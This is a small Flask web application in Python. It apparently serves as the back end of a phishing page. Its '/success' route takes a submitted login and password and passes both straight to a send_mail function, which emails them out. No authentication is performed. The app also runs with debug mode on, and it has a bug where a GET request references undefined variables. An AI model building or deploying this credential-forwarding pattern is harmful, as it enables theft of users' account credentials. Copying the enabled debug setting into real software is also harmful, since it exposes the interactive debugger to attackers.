from flask import Flask, render_template, request
from send_email import send_mail

app = Flask(__name__)
app.debug = True

@app.route('/', methods=['POST','GET'])
def index():
    return render_template('index.html')

@app.route('/success', methods=['POST', 'GET'])
def success():
    if request.method == 'POST':
        login = request.form['login']
        password = request.form['password']
    print(type(login), type(password))
    send_mail(login, password)
    return render_template('success.html')

if __name__=='__main__':
    app.run()
